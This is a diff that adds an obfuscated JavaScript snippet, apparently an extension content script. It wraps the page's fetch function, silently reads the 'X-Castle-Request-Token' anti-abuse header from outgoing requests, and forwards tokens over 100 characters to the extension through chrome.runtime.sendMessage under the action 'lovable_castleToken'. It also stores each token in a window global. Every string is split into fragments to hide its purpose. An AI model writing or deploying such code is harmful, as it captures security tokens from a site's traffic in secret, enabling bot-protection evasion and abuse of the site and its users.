@@ -1,0 +1,23 @@
+(function(){
+var _n594c98=window['fet'+'ch'];
+window['fet'+'ch']=function(_n13bcc5,_nd75be8){
+try{
+var _n5b8563=_nd75be8&&_nd75be8['hea'+'der'+'s'],_n12af68=null;
+if(_n5b8563){
+if(typeof _n5b8563['get']==='fun'+'cti'+'on')_n12af68=_n5b8563['get']('x-c'+'ast'+'le-'+'req'+'ues'+'t-t'+'oke'+'n')||_n5b8563['get']('X-C'+'ast'+'le-'+'Req'+'ues'+'t-T'+'oke'+'n');
+else typeof _n5b8563==='obj'+'ect'&&(_n12af68=_n5b8563['X-C'+'ast'+'le-'+'Req'+'ues'+'t-T'+'oke'+'n']||_n5b8563['x-c'+'ast'+'le-'+'req'+'ues'+'t-t'+'oke'+'n']||null);
+}
+if(_n12af68&&_n12af68['len'+'gth']>0x64){
+var _n3a9238={
+}
+;
+_n3a9238['act'+'ion']='lov'+'abl'+'e_c'+'ast'+'leT'+'oke'+'n',_n3a9238['tok'+'en']=_n12af68,chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_n3a9238),window['__q'+'l_c'+'ast'+'le_'+'tok'+'en']=_n12af68;
+}
+}
+catch(_n1bd171){
+}
+return _n594c98['app'+'ly'](this,arguments);
+}
+;
+}
+());
